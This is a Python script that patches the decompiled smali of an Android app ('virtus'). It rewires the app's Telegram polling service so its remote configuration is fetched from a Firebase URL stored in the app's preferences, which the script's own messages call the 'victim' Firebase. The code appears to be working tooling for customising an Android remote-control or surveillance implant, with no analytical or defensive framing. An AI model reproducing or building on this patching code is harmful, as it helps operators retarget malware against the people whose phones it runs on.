#!/usr/bin/env python3
"""APK readConfig: victim Firebase virtus_config via firebase_poll_url prefs."""

from pathlib import Path

_APK_DIR = Path(__file__).resolve().parent
SMALI = _APK_DIR / "virtus_decompiled/smali/com/virtus/module/TelegramPollingService.smali"

PREFS_SAVE = """    .line 463
    const-string v2, "license_key"

    const-string v3, ""

    invoke-interface {p1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1"""

PREFS_SAVE_FIXED = """    .line 463
    move-object v6, p1

    const-string v2, "license_key"

    const-string v3, ""

    invoke-interface {v6, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1"""

URL_BLOCK_OLD = """    :cond_0
    const/4 v2, 0x0

    .line 467
    :try_start_0
    new-instance v4, Ljava/net/URL;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ".json"

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {v4, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V"""

URL_BLOCK_NEW = """    :cond_0
    const/4 v2, 0x0

    .line 467
    :try_start_0
    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    const-string v2, "firebase_poll_url"

    const-string v3, ""

    invoke-interface {v6, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v7

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :virtus_module_cfg

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/virtus_config.json"

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :virtus_cfg_url

    :virtus_module_cfg
    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ".json"

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :virtus_cfg_url
    new-instance v4, Ljava/net/URL;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {v4, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V"""


def main() -> None:
    text = SMALI.read_text()
    if ":virtus_module_cfg" in text:
        print("readConfig victim path already patched (skip)")
        return
    if PREFS_SAVE not in text:
        raise SystemExit("readConfig prefs block not found")
    if URL_BLOCK_OLD not in text:
        raise SystemExit("readConfig URL block not found")
    text = text.replace(PREFS_SAVE, PREFS_SAVE_FIXED, 1)
    text = text.replace(URL_BLOCK_OLD, URL_BLOCK_NEW, 1)
    SMALI.write_text(text)
    print("readConfig victim firebase_poll_url -> virtus_config.json patched")


if __name__ == "__main__":
    main()
